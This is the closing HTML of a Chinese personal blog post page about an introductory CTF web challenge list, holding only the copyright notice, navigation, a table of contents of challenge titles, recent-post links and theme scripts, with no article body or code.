+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">tgrddf55</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/08/2025-06-08-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%952/">http://example.com/2025/06/08/2025-06-08-web入门题单2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">tgrddf55's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/image/49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/06/09/2025-06-09-sql%E5%85%A5%E9%97%A8/" title="sql study"><img class="cover" src="/image/36.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">sql study</div></div></a></div><div class="next-post pull-right"><a href="/2025/06/08/2025-06-14-newstarCTF-web/" title="newstarCTF2024-web"><img class="cover" src="/image/35.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">newstarCTF2024-web</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/05/30/2025-05-30-js%E5%85%A5%E9%97%A8/" title="js study"><img class="cover" src="/image/9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">js study</div></div></a></div><div><a href="/2025/05/31/2025-05-31-css%E5%85%A5%E9%97%A8/" title="css study"><img class="cover" src="/image/41.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-31</div><div class="title">css study</div></div></a></div><div><a href="/2025/06/07/2025-06-07-php%E5%85%A5%E9%97%A8/" title="php study"><img class="cover" src="/image/33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-07</div><div class="title">php study</div></div></a></div><div><a href="/2025/05/30/2025-05-30-html%E5%85%A5%E9%97%A8/" title="html study"><img class="cover" src="/image/45.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">html study</div></div></a></div><div><a href="/2025/06/02/2025-06-02-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="web入门题单"><img class="cover" src="/image/48.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="title">web入门题单</div></div></a></div><div><a href="/2025/06/09/2025-06-09-sql%E5%85%A5%E9%97%A8/" title="sql study"><img class="cover" src="/image/36.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-09</div><div class="title">sql study</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/tgrddf55.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tgrddf55</div><div class="author-info__description">几时归去，做个闲人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tgrddf55" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/455700704" target="_blank" title="bilibili"><i class="fab fa-bilibili" style="color: #00aeff;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5"><span class="toc-text">链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="toc-text">我Flag呢？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%B1%E5%BD%93%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F"><span class="toc-text">就当无事发生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="toc-text">导弹迷踪</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1zjs"><span class="toc-text">1zjs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Follow-me-and-hack-me"><span class="toc-text">Follow me and hack me</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vim-yyds"><span class="toc-text">Vim yyds</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-text">作业管理系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="toc-text">PHP是世界上最好的语言！！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B-%EF%BC%81"><span class="toc-text">这是什么？SQL ！注一下 ！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ping"><span class="toc-text">Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-check-ip-function-%E8%83%BD%E7%94%9F%E6%95%88%EF%BC%9F"><span class="toc-text">为什么 check_ip &#x3D; function(){} 能生效？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%8C-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9-%E4%B8%AD%E7%9A%84-check-ip-%E5%87%BD%E6%95%B0%E4%BD%93%E5%8D%B4%E6%B2%A1%E6%95%88%E6%9E%9C%EF%BC%9F"><span class="toc-text">❌ 为什么你直接修改 &lt;script&gt; 中的 check_ip() 函数体却没效果？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-1-%E7%9A%84-JS-%E6%98%AF%E4%B8%80%E6%AC%A1%E6%80%A7%E6%89%A7%E8%A1%8C%E7%9A%84"><span class="toc-text">📌 1. &lt;script&gt; 的 JS 是一次性执行的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-2-%E5%87%BD%E6%95%B0%E5%B7%B2%E7%BB%8F%E2%80%9C%E7%BB%91%E5%AE%9A%E2%80%9D%E5%88%B0-form-%E7%9A%84-onsubmit-%E4%B8%8A%E4%BA%86"><span class="toc-text">📌 2. 函数已经“绑定”到 form 的 onsubmit 上了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%87%8D%E6%96%B0%E8%B5%8B%E5%80%BC-check-ip-function-%E5%B0%B1%E8%83%BD%E7%94%9F%E6%95%88%EF%BC%9F"><span class="toc-text">✅ 为什么重新赋值 check_ip &#x3D; function(){} 就能生效？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flag-%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81"><span class="toc-text">Flag 点击就送！</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础"><img src="/image/52.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化基础"/></a><div class="content"><a class="title" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础">php反序列化基础</a><time datetime="2025-06-26T16:00:00.000Z" title="发表于 2025-06-27 00:00:00">2025-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议"><img src="/image/56.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><img src="/image/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti"><img src="/image/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python_ssti"/></a><div class="content"><a class="title" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti">python_ssti</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较"><img src="/image/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php弱比较"/></a><div class="content"><a class="title" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较">php弱比较</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/49.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By tgrddf55</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
